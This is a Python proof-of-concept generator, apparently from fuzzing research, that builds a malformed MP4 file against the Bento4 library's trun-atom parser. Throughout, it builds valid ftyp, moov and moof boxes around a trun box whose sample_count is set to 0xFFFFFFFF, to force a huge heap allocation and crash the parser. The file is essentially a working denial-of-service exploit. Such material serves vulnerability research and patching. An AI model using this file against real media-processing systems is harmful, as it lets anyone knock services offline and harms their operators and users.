#!/usr/bin/env python3
"""
PoC generator for VULN 003: AP4_TrunAtom missing sample_count bounds check.
Constructs an MP4 file with a trun atom having sample_count=0xFFFFFFFF,
which causes a massive heap allocation attempt leading to crash/DoS.
"""

import struct
import os

def box(btype, data):
    """Build a box: 4-byte big-endian size + 4-byte type + data."""
    return struct.pack('>I', 8 + len(data)) + btype + data


def build_ftyp():
    # ftyp: brand='isom', version=0, compatible='isom'
    data = b'isom' + struct.pack('>I', 0) + b'isom'
    return box(b'ftyp', data)


def build_mvhd():
    # mvhd version 0:
    # creation_time(4) + modification_time(4) + timescale(4) + duration(4)
    # rate(4) + volume(2) + reserved(10) + matrix(36) + pre_defined(24) + next_track_id(4)
    # = 4+4+4+4+4+2+10+36+24+4 = 96 bytes data, total box = 104 bytes
    creation_time = 0
    modification_time = 0
    timescale = 1000
    duration = 0
    rate = 0x00010000  # 1.0 fixed point
    volume = 0x0100    # 1.0 fixed point (2 bytes)
    reserved_10 = b'\x00' * 10
    # Identity matrix
    matrix = struct.pack('>9I',
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    pre_defined = b'\x00' * 24
    next_track_id = 1

    data = struct.pack('>IIIII', creation_time, modification_time, timescale, duration, rate)
    data += struct.pack('>H', volume)
    data += reserved_10
    data += matrix
    data += pre_defined
    data += struct.pack('>I', next_track_id)
    return box(b'mvhd', data)


def build_moov():
    mvhd = build_mvhd()
    return box(b'moov', mvhd)


def build_mfhd():
    # mfhd: version(1)+flags(3)+sequence_number(4)
    data = b'\x00\x00\x00\x00' + struct.pack('>I', 1)
    return box(b'mfhd', data)


def build_tfhd():
    # tfhd: version(1)+flags(3, 0x000000)+track_id(4)
    data = b'\x00\x00\x00\x00' + struct.pack('>I', 1)
    return box(b'tfhd', data)


def build_trun():
    # trun: size(4)+type(4)+version(1)+flags(3)+sample_count(4) = 16 bytes
    # flags=0x000000 means no optional fields
    # sample_count = 0xFFFFFFFF triggers huge allocation
    size = 16
    return (struct.pack('>I', size) +
            b'trun' +
            b'\x00\x00\x00\x00' +           # version=0, flags=0
            struct.pack('>I', 0xFFFFFFFF))   # sample_count


def build_traf():
    tfhd = build_tfhd()
    trun = build_trun()
    return box(b'traf', tfhd + trun)


def build_moof():
    mfhd = build_mfhd()
    traf = build_traf()
    return box(b'moof', mfhd + traf)


def build_mdat():
    return box(b'mdat', b'')


def main():
    outdir = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4AtomFactory_cpp'
    outfile = os.path.join(outdir, 'vuln_003.mp4')

    ftyp = build_ftyp()
    moov = build_moov()
    moof = build_moof()
    mdat = build_mdat()

    mp4 = ftyp + moov + moof + mdat

    os.makedirs(outdir, exist_ok=True)
    with open(outfile, 'wb') as f:
        f.write(mp4)

    print(f"Written {len(mp4)} bytes to {outfile}")
    print(f"  ftyp size: {len(ftyp)}")
    print(f"  moov size: {len(moov)}")
    print(f"  moof size: {len(moof)}")
    print(f"  mdat size: {len(mdat)}")

    # Verify trun content
    trun_data = build_trun()
    sample_count = struct.unpack('>I', trun_data[12:16])[0]
    print(f"  trun sample_count: 0x{sample_count:08X} ({sample_count})")


if __name__ == '__main__':
    main()
